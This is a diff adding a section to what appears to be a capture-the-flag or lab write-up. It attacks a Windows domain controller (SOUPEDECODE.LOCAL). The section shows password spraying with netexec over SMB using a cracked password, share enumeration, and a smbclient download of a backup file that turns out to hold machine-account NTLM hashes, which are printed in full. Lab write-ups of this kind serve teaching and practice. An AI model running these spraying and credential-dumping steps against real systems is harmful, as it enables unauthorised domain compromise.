@@ -259,3 +259,56 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 0g 0:00:00:42 71.13% (ETA: 18:35:28) 0g/s 242581p/s 1212Kc/s 1212KC/s alynahs#1mommy..alycia0211
 Password123!!    (?)
 
+if you recall there is no open p21 so we aren't using this svc account to bust into an FTP server
+
+root@ip-10-201-48-39:~# nxc smb 10.201.9.75 -u accounts.txt -p 'Password123!!'
+SMB         10.201.9.75     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.201.9.75     445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!! 
+
+plus is what we ant to see, funny I kept having issues using big U like it is SMBclient or hydra where the capital U or P matters
+
+root@ip-10-201-48-39:~# nxc smb 10.201.9.75 -u 'file_svc' -p 'Password123!!' --shares
+SMB         10.201.9.75     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.201.9.75     445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!! 
+SMB         10.201.9.75     445    DC01             [*] Enumerated shares
+SMB         10.201.9.75     445    DC01             Share           Permissions     Remark
+SMB         10.201.9.75     445    DC01             -----           -----------     ------
+SMB         10.201.9.75     445    DC01             ADMIN$                          Remote Admin
+SMB         10.201.9.75     445    DC01             backup          READ            
+SMB         10.201.9.75     445    DC01             C$                              Default share
+SMB         10.201.9.75     445    DC01             IPC$            READ            Remote IPC
+SMB         10.201.9.75     445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.201.9.75     445    DC01             SYSVOL          READ            Logon server share 
+SMB         10.201.9.75     445    DC01             Users                           
+
+
+We now have that juicy backup folder read perms. This hopefully enumerates some interesting information about the domain on top of our existing user list and 5 krb TGSes.
+
+root@ip-10-201-48-39:~# smbclient //10.201.9.75/backup -U file_svc 
+Password for [WORKGROUP\file_svc]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Mon Jun 17 18:41:17 2024
+  ..                                 DR        0  Fri Jul 25 18:51:20 2025
+  backup_extract.txt                  A      892  Mon Jun 17 09:41:05 2024
+
+		12942591 blocks of size 4096. 10798379 blocks available
+smb: \> get backup_extract.txt
+getting file \backup_extract.txt of size 892 as backup_extract.txt (58.1 KiloBytes/sec) (average 58.1 KiloBytes/sec)
+smb: \>
+
+finally a straight forward procedure I didn't need a cheat shet for
+
+root@ip-10-201-48-39:~# cat backup_extract.txt 
+WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
+DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
+CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
+FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
+MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
+BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
+ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
+PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
+ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
+MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
+
+It is all hashes
